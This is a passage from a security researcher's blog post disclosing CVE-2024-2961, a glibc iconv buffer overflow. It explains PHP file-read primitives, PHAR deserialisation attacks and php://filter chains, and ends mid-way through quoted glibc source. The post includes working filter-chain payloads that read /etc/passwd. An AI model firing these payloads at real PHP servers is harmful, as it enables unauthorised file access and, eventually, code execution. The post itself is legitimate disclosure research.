<!DOCTYPE html><html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head><meta charset="utf-8"/><title>Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)</title><meta content="A few months ago, I stumbled upon a 24 years old buffer overflow in the glibc, the base library for linux programs. Despite being reachable in multiple well-known libraries or executables, it proved rarely exploitable â while it didn't provide much leeway, it required hard-to-achieve preconditions. Looking for targets lead mainly to disappointment. On PHP however, the bug shone, and proved useful in exploiting its engine in two different ways." name="description"/><meta content="width=300, initial-scale=1.0, shrink-to-fit=no" name="viewport"/><meta content="Ambionics" property="og:site_name"/><meta content="Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)" property="og:title"/><meta content="website" property="og:type"/><meta content="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1" property="og:url"/><meta content="https://www.ambionics.io/images/iconv-cve-2024-2961-p1/iconv-cve-2024-2961-p1.png" property="og:image"/><meta content="A few months ago, I stumbled upon a 24 years old buffer overflow in the glibc, the base library for linux programs. Despite being reachable in multiple well-known libraries or executables, it proved rarely exploitable â while it didn't provide much leeway, it required hard-to-achieve preconditions. Looking for targets lead mainly to disappointment. On PHP however, the bug shone, and proved useful in exploiting its engine in two different ways." property="og:description"/><meta content="en_EN" property="og:locale"/><meta content="summary_large_image" name="twitter:card"/><meta content="@ambionics" name="twitter:creator"/><meta content="@ambionics" name="twitter:site"/><meta content="Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)" name="twitter:title"/><meta content="https://www.ambionics.io/images/iconv-cve-2024-2961-p1/iconv-cve-2024-2961-p1.png" name="twitter:image"/><meta content="A few months ago, I stumbled upon a 24 years old buffer overflow in the glibc, the base library for linux programs. Despite being reachable in multiple well-known libraries or executables, it proved rarely exploitable â while it didn't provide much leeway, it required hard-to-achieve preconditions. Looking for targets lead mainly to disappointment. On PHP however, the bug shone, and proved useful in exploiting its engine in two different ways." name="twitter:description"/><meta content="https://www.ambionics.io" name="twitter:url"/><link href="/theme/images/favicon.png" rel="icon" type="image/png"/><link href="https://www.ambionics.io/feeds/all.atom.xml" rel="alternate" title="Ambionics Security Blog Atom Feed" type="application/atom+xml"/><link href="https://www.ambionics.io/feeds/all.rss.xml" rel="alternate" title="Ambionics Security Blog Atom Feed" type="application/rss+xml"/><link href="/theme/webassets-external/6d0f1f34aabf54cc3a6837420717e25e_animate.min.css" rel="stylesheet"/><link href="/theme/webassets-external/3d4e3fa53ab052f19188400028d21779_bootstrap.min.css" rel="stylesheet"/><link href="/theme/webassets-external/3e4b83a457b81b4b2b1825aa2d727536_font-awesome.min.css" rel="stylesheet"/><link href="/theme/webassets-external/86a9df5785d9849049d3e7a19993cc92_simpletextrotator.css" rel="stylesheet"/><link href="/theme/webassets-external/0fea10e3ef82aec097d16ca3c9482bf2_owl.carousel.css" rel="stylesheet"/><link href="/theme/webassets-external/19a33e95af3925f494ec1cc21e0d9cfe_style.css" rel="stylesheet"/><link href="/theme/webassets-external/fd94d189d1c97c861212a685d1dd687d_responsive.css" rel="stylesheet"/><link href="/theme/webassets-external/3bd32a4af419b5ddcf783e4050fb215c_main.css" rel="stylesheet"/><link href="/theme/webassets-external/eb996a76bd16e6f4d0f33d9915b03100_dark.css" rel="stylesheet"/><link href="/theme/webassets-external/93fd99f0f745edabe0a13e99d4699636_red.css" rel="stylesheet"/><link href="https://fonts.googleapis.com/css?family=Montserrat%7CRaleway:400,100,,200,300,600,700" rel="stylesheet" type="text/css"/><link href="/theme/css/pygment.css" rel="stylesheet"/></head><body class="parallax lang_en"><nav class="white-nav" id="navigation"><div class="navigation first-nav double-nav raleway"><div class="nav-inner clearfix"><div class="logo f-left"><a class="logo-link scroll" href="/" title="home"><img alt="Logo" data-second-logo="/theme/images/logo/logo_condensed_dark.png" src="/theme/images/logo/logo_condensed_white.png"/></a></div><a class="mobile-nav-button"><i class="fa fa-bars"></i></a><div class="nav-menu clearfix f-right"><ul class="nav uppercase normal oswald big-texts"><li><a class="scroll" href="/how-it-works" title="How it works">How it works</a></li><li><a class="scroll" href="/offers" title="Offers">Offers</a></li><li><a class="scroll" href="/about" title="About">About</a></li><li><a class="scroll" href="/blog/" title="Blog">Blog</a></li><li><a class="scroll" href="/contact" title="Contact">Contact</a></li></ul></div></div></div></nav><section class="background50 parallax big-header" id="page-header"><div class="page_header_inner clearfix white"><div class="center-details f-center"><h2 class="page_header thin oswald" data-0="opacity:1;" data-600="opacity:0;">Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)</h2><h5 class="page_note extra-light"></h5></div></div></section><div class="top-edge"><img alt="Polygonal Background" class="polygonal-bg" src="/theme/images/bkgd-top-edge.png"/></div><section class="background1"><div class="inner t-center clearfix"><section class="clearfix boxed pt-40 mb-80" id="blog"><div class="col-md-12 pl-00 pr-10 mt-90"><div class="post clearfix"><div class="dates f-left"><h6 class="date"><span class="day colored helvetica">27</span> May, 2024</h6><div class="details"><ul class="t-right fullwidth"><li>Posted By Charles Fol <i class="fa fa-user"></i></li><li>iconv libc glibc cve-2024-2961 php filter <i class="fa fa-tag"></i></li></ul></div></div><div class="post-inner f-right t-left" id="article-content"><div class="post-media mp-gallery"><img alt="Full Article" src="/images/iconv-cve-2024-2961-p1/iconv-cve-2024-2961-p1.png"/></div><div class="post-text light t-left"><h1 id="introduction">Introduction</h1><p>A few months ago, I stumbled upon a 24 years old buffer overflow in the glibc, the base library for linux programs. Despite being reachable in multiple well-known libraries or executables, it proved rarely exploitable â while it didn't provide much leeway, it required hard-to-achieve preconditions. Looking for targets lead mainly to disappointment. On PHP however, <strong>the bug shone</strong>, and proved useful in exploiting its engine in two different ways.</p><p>Due to the amount of material, the impact and exploitation of the bug will be documented over a three part series. In this first part of the series, I'll describe how I encountered the bug, why suitable targets are rare, and finally dive into the PHP engine to demonstrate a new exploitation vector: <strong>converting file read primitives into remote code execution in PHP applications</strong>.</p><p><em>Note: part 2 is available <a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p2">here</a></em></p><p><em>If you are not familiar with web exploitation, PHP, or the PHP engine, mind not: I will explain relevant notions along the way.</em></p><ul><li><a href="#introduction">Introduction</a></li><li><a href="#discovery-a-story-about-filters">Discovery: a story about filters</a><ul><li><a href="#file-read-primitives-in-php">File read primitives in PHP</a></li><li><a href="#an-introduction-to-php-filters">An introduction to PHP filters</a></li><li><a href="#php-filters-prefix-suffix-and-crash">PHP filters: prefix, suffix, and crash</a></li></ul></li><li><a href="#cve-2024-2961-a-bug-in-the-glibc">CVE-2024-2961: A bug in the glibc</a><ul><li><a href="#the-iconv-api">The <code>iconv()</code> API</a></li><li><a href="#out-of-bound-write-when-converting-to-iso-2022-cn-ext">Out-of-bound write when converting to ISO-2022-CN-EXT</a></li><li><a href="#conditions-and-primitive">Conditions and primitive</a><ul><li><a href="#libxml2-an-ocean-of-bytes">libxml2: an ocean of bytes</a></li><li><a href="#pkexec-4-bytes-are-too-many">pkexec: 4 bytes are too many</a></li><li><a href="#conditions-and-primitive-updated">Conditions and primitive (updated)</a></li></ul></li></ul></li><li><a href="#exploiting-php-filters">Exploiting PHP filters</a><ul><li><a href="#a-primer-on-phps-heap">A primer on PHP's heap</a></li><li><a href="#php-filters-internals">PHP filters internals</a></li><li><a href="#situation-and-goals">Situation and goals</a></li><li><a href="#exploitation">Exploitation</a><ul><li><a href="#single-bucket">Single bucket</a></li><li><a href="#dechunking-properly">Dechunking properly</a></li><li><a href="#free-list-control-write-what-where">Free list control: write-what-where</a></li><li><a href="#code-execution">Code execution</a></li><li><a href="#exploit-performance">Exploit performance</a></li><li><a href="#demo">Demo</a></li></ul></li></ul></li><li><a href="#impact">Impact</a><ul><li><a href="#standard-sinks">Standard sinks</a></li><li><a href="#using-vulnerabilities">Using vulnerabilities</a><ul><li><a href="#sql-injection-to-rce">SQL injection to RCE</a></li><li><a href="#xxe">XXE</a></li></ul></li><li><a href="#as-a-replacement-for-phar">As a replacement for PHAR</a></li><li><a href="#parsing-libraries">Parsing libraries</a></li><li><a href="#class-instantiations">Class instantiations</a></li><li><a href="#as-an-improvement-to-a-gadget-chain">As an improvement to a gadget chain</a></li><li><a href="#others-probably">Others, probably</a></li></ul></li><li><a href="#timeline">Timeline</a></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#were-hiring">We're hiring!</a></li></ul><h1 id="discovery-a-story-about-filters">Discovery: a story about filters</h1><h2 id="file-read-primitives-in-php">File read primitives in PHP</h2><p>Let's first cover the basics. Say that, while performing an assessment, you find a file read primitive such as this one:</p><div class="highlight"><pre><span></span><code><span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]);</span>
</code></pre></div><p>What can you do with it? Well, read files, obviously. You can read <code>/etc/passwd</code>, for instance. But PHP also lets you use other protocols, such as <code>http://</code> or <code>ftp://</code>. As a result, you can ask PHP to go get the front page of google for you, using <code>http://google.com</code>; or download a file from a FTP server, using <code>ftp://user:passwd@ftp.target.com/file.bin</code>. But that's not all; PHP also implements custom protocols, such as <code>phar://</code>.</p><p><code>phar://</code> lets you read inside a <a href="https://www.php.net/manual/en/phar.using.intro.php">PHAR archive</a>. <em>PH</em>AR stands for <em>PHP</em> archive, the same way that <em>J</em>AR stands for <em>Java</em> archive. It is a grouping of files such as:</p><ul><li>Source code</li><li>Resources</li><li>Serialized metadata</li></ul><p>This protocol has been the downfall of PHP for many years, because when you use it to access a PHAR file, its metadata gets deserialized. The usual PHAR attack looks like this:</p><ol><li>Upload a PHAR archive to target server (PHAR files are very polyglottish, so you can make them look like an image, a PDF, or anything, really)</li><li>Access the PHAR file using your file read primitive, with <code>phar:///path/to/file.phar/test</code></li><li>An arbitrary payload is deserialized</li></ol><p>Converting deserialisation into code execution can be done in many ways, but people generally rely on the go-to deserialisation tool on PHP, <a href="https://github.com/ambionics/phpggc">PHPGGC</a>.</p><p>You cannot overstate the impact of PHAR attacks. From their creation in 2018, they have been pivotal to getting shells on PHP targets. But the party is coming to an end:</p><ul><li>Starting from PHP 8.0 (released in 2020), <code>phar://</code> does not deserialise the metadata anymore. (they didn't use the metadata anyways, so why deserialise it). This kills PHAR attacks entirely.</li><li>Big applications (such as Drupal or Magento) have been disabling the <code>phar://</code> protocol</li><li>Deserialisation is going to become harder to exploit as time goes by: libraries are patching their deserialisation chains, and typing is making a comeback, drastically reducing deserialisation paths.</li></ul><p>But <code>phar://</code> was not the only protocol useful protocol for attackers; another one yielded great results as well: <code>php://filter</code>.</p><h2 id="an-introduction-to-php-filters">An introduction to PHP filters</h2><p>Over several years, people have taken interest in <code>php://filter</code>, another PHP specific protocol (if the name didn't make it obvious). It provides a way to apply transformations to a stream before it is returned. The syntax is:</p><div class="highlight"><pre><span></span><code>php://filter/[filters...]/resource=[resource]
</code></pre></div><p>The resource can be anything we've already talked about in the previous section: a simple file, an HTTP response, a file from an FTP server...</p><p>The filters are a list of transformation that you want PHP to apply on the stream. Here, we ask PHP to convert the contents of the resource to base64 using the <code>convert.base64-encode</code> filter:</p><div class="highlight"><pre><span></span><code>php://filter/convert.base64-encode/resource=/etc/passwd
</code></pre></div><p>It returns:</p><div class="highlight"><pre><span></span><code>cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9u
b2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6
...
Yi92bnN0YXQ6L2Jpbi9mYWxzZQpyZWRpczp4OjEwMjoxMDM6cmVkaXM6L3Zhci9saWIvcmVkaXM6
L2Jpbi9mYWxzZQo=
</code></pre></div><p>You can add as many filters as you need. Here, I ask PHP to base64-encode the stream twice:</p><div class="highlight"><pre><span></span><code>php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
</code></pre></div><p>And I get:</p><div class="highlight"><pre><span></span><code>Y205dmREcDRPakE2TURweWIyOTBPaTl5YjI5ME9pOWlhVzR2WVhOb0NtSnBianA0T2pFNk1UcGlh
...
RXdNam94TURNNmNtVmthWE02TDNaaGNpOXNhV0l2Y21Wa2FYTTZMMkpwYmk5bVlXeHpaUW89
</code></pre></div><p>Obviously, base64-encoding is not the only thing you can do. Many filters are available. They include:</p><ul><li><code>string.upper</code>, which converts a string to uppercase</li><li><code>string.lower</code>, which converts a string to lowercase</li><li><code>string.rot13</code>, which does some BC crypto</li><li><code>convert.iconv.X.Y</code>, which converts charset from <code>X</code> to <code>Y</code></li></ul><p>Let's take a look at the last filter: <code>convert.iconv.X.Y</code>. Say that I need to convert my file from UTF8 to UTF16. I can use:</p><div class="highlight"><pre><span></span><code>php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd
</code></pre></div><p>Which gives (in hex form):</p><div class="highlight"><pre><span></span><code><span class="mi">00000000</span><span class="o">:</span><span class="w"> </span><span class="n">fffe</span><span class="w"> </span><span class="mi">7200</span><span class="w"> </span><span class="mi">6</span><span class="n">f00</span><span class="w"> </span><span class="mi">6</span><span class="n">f00</span><span class="w"> </span><span class="mi">7400</span><span class="w"> </span><span class="mi">3</span><span class="n">a00</span><span class="w"> </span><span class="mi">7800</span><span class="w"> </span><span class="mi">3</span><span class="n">a00</span><span class="w">  </span><span class="o">..</span><span class="n">r</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">t</span><span class="o">.:.</span><span class="n">x</span><span class="o">.:.</span>
<span class="mi">00000010</span><span class="o">:</span><span class="w"> </span><span class="mi">3000</span><span class="w"> </span><span class="mi">3</span><span class="n">a00</span><span class="w"> </span><span class="mi">3000</span><span class="w"> </span><span class="mi">3</span><span class="n">a00</span><span class="w"> </span><span class="mi">7200</span><span class="w"> </span><span class="mi">6</span><span class="n">f00</span><span class="w"> </span><span class="mi">6</span><span class="n">f00</span><span class="w"> </span><span class="mi">7400</span><span class="w">  </span><span class="mi">0</span><span class="o">.:.</span><span class="mi">0</span><span class="o">.:.</span><span class="n">r</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">t</span><span class="o">.</span>

<span class="w">                                </span><span class="o">...</span>

<span class="mi">00000</span><span class="n">a40</span><span class="o">:</span><span class="w"> </span><span class="mi">2</span><span class="n">f00</span><span class="w"> </span><span class="mi">6200</span><span class="w"> </span><span class="mi">6900</span><span class="w"> </span><span class="mi">6</span><span class="n">e00</span><span class="w"> </span><span class="mi">2</span><span class="n">f00</span><span class="w"> </span><span class="mi">6600</span><span class="w"> </span><span class="mi">6100</span><span class="w"> </span><span class="mi">6</span><span class="n">c00</span><span class="w">  </span><span class="sr">/.b.i.n./</span><span class="o">.</span><span class="na">f</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span>
<span class="mi">00000</span><span class="n">a50</span><span class="o">:</span><span class="w"> </span><span class="mi">7300</span><span class="w"> </span><span class="mi">6500</span><span class="w"> </span><span class="mi">0</span><span class="n">a00</span><span class="w">                           </span><span class="n">s</span><span class="o">.</span><span class="na">e</span><span class="o">...</span>
</code></pre></div><p>The multitude of filters and the possibility to chain them lead to some great research on PHP, such as <a href="https://gynvael.coldwind.pl/?id=671">here</a>, <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">here</a>, or <a href="https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py">here</a>. In fact, using precisely picked filters (a <em>filter chain</em>), attackers can do fantastic things, such as <a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it">changing the contents of a file entirely</a>, or using an <a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">error-based oracle to extract its bytes one-by-one</a>.</p><p>For instance, here is a filter chain that preprends <code>Hello world!</code> to <code>/etc/passwd</code>:</p><div class="highlight"><pre><span></span><code>php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|
convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM860.UTF16|
convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|
convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|
convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|
convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|
convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|
convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|
convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|
convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|
convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|
convert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|
convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|
convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO2022KR.UTF16|
convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|
convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|
convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|
convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|
convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|
convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|
convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
</code></pre></div><p>And the result:</p><div class="highlight"><pre><span></span><code>Hello, world!!!root:x:0:0:root:/root:/bin/bash...
</code></pre></div><h2 id="php-filters-prefix-suffix-and-crash">PHP filters: prefix, suffix, and crash</h2><p>Sadly, file reads are not always as easy as a:</p><div class="highlight"><pre><span></span><code><span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]);</span>
</code></pre></div><p>Oftentimes, the file will not be returned as-is, but it will be parsed or checked in some way. As an example, I often encountered variations of this piece of code, that expects your file to be valid JSON:</p><div class="highlight"><pre><span></span><code><span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">message</span><span class="p">;</span>
</code></pre></div><p>We have a file read here, but the contents is then JSON-deserialized, and only part of the document is returned. In order to read standard files, such as <code>/etc/passwd</code>, we would need to add an arbitrary prefix <strong>and suffix</strong> to a stream. Something like: <code>{"message": "&lt;contents-of-/etc/passwd&gt;"}</code>. In late 2023, the state of affairs was that you could use <code>php://filter</code> chains to add a prefix to a stream, but not a suffix. So I started working on an algorithm to do the latter<em>*</em>.</p><p>At the time, I did not know anything about charsets, or encodings (to be perfectly honest, I still don't know the difference). To get started, I built a bruteforce script which stacked a few <code>iconv</code> filters on top of each other, and displayed the results. Something like:</p><div class="highlight"><pre><span></span><code>php://filter/convert.iconv.A.B/convert.iconv.C.D/convert.iconv.E.F/resource=data:,test123
</code></pre></div><p>And a some point, my Â«fuzzerÂ» <strong>crashed</strong>.</p><p>Having worked with PHP for most of my life, I was quick to point fingers. But little did I know, the bug resided much lower in the call chain: all the way down to the <strong>glibc</strong>.</p><p><em>* Note: the research yielded a tool that was published in December, 2023: <a href="https://www.ambionics.io/blog/wrapwrap-php-filters-suffix">wrapwrap</a>.</em></p><h1 id="cve-2024-2961-a-bug-in-the-glibc">CVE-2024-2961: A bug in the glibc</h1><h2 id="the-iconv-api">The <code>iconv()</code> API</h2><p>When PHP converts from one charset to another, it uses <a href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html"><strong>iconv</strong></a>, an API to Â«convert characters in input buffer using conversion descriptor to output bufferÂ». This API is, on Linux, implemented by the <a href="https://www.gnu.org/software/libc/">glibc</a>.</p><p>The API is very simple. You first open a conversion descriptor, that indicates the input and the output charsets.</p><div class="highlight"><pre><span></span><code><span class="n">iconv_t</span><span class="w"> </span><span class="nf">iconv_open</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">tocode</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fromcode</span><span class="p">);</span>
</code></pre></div><p>Then, you can use <code>iconv()</code> to convert the input buffer <code>inbuf</code> to its new charset in <code>outbuf</code>, the output buffer.</p><div class="highlight"><pre><span></span><code><span class="kt">size_t</span><span class="w"> </span><span class="nf">iconv</span><span class="p">(</span><span class="n">iconv_t</span><span class="w"> </span><span class="n">cd</span><span class="p">,</span>
<span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="kr">restrict</span><span class="w"> </span><span class="n">inbuf</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="kr">restrict</span><span class="w"> </span><span class="n">inbytesleft</span><span class="p">,</span>
<span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="kr">restrict</span><span class="w"> </span><span class="n">outbuf</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="kr">restrict</span><span class="w"> </span><span class="n">outbytesleft</span><span class="p">);</span>
</code></pre></div><p>Buffer management is the responsibility of the caller. If the output buffer is not big enough, <code>iconv()</code> will return an error indicating so, and you will be able to reallocate <code>outbuf</code> and continue the conversion by calling <code>iconv()</code> again. What the function garantees is that it will never read more than <code>inbytesleft</code> bytes from <code>inbuf</code>, or <strong>write</strong> more than <code>outbytesleft</code> bytes to <code>outbuf</code>. Never? Well, in <em>theory</em>...</p><h2 id="out-of-bound-write-when-converting-to-iso-2022-cn-ext">Out-of-bound write when converting to ISO-2022-CN-EXT</h2><p>It just so happens that, when converting data to the <code>ISO-2022-CN-EXT</code> charset, <em>iconv</em> might fail to check if enough space remains in the output buffer before writing to it.</p><p>In reality, <code>ISO-2022-CN-EXT</code> is actually a collection of charsets: when it needs to encode a character, it will choose the appropriate charset, and emit an escape sequence to indicate that the decoder needs to switch to such charset.</p><p>The code below is the part which is responsible for emitting such escape sequences. It is made of 3 <code>if</code> blocks, that each write different escape sequences to <code>outbuf</code> (pointed to by <code>outptr</code>). If you look at the first one <sup>[1]</sup>, you can see that it is prefixed by another <code>if()</code> block that checks that the output buffer is big enough to fit 4 characters. The other two <code>if()</code> <sup>[2][3]</sup> do <strong>not</strong>. As a result, the escape sequences might be written out-of-bounds.</p><div class="highlight"><pre><span></span><code><span class="c1">// iconvdata/iso-2022-cn-ext.c</span>

<span class="cm">/* See whether we have to emit an escape sequence.  */</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">set</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">used</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="cm">/* First see whether we announced that we use this</span>
<span class="cm">        character set.  */</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">used</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SO_mask</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SO_ann</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"> </span><span class="c1">// [1]</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="p">;</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">outptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">outend</span><span class="p">)</span><span class="w"> </span><span class="c1">// &lt;-------------------- BOUND CHECK</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__GCONV_FULL_OUTPUT</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">assert</span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="w">        </span><span class="n">escseq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">")A</span><span class="se">\0\0</span><span class="s">)G)E"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ESC</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'$'</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">outptr</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="o">++</span><span class="p">;</span>

<span class="w">        </span><span class="n">ann</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">SO_ann</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">used</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SS2_mask</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">ann</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">SS2_ann</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">used</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"> </span><span class="c1">// [2]</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">escseq</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// &lt;-------------------- NO BOUND CHECK</span>

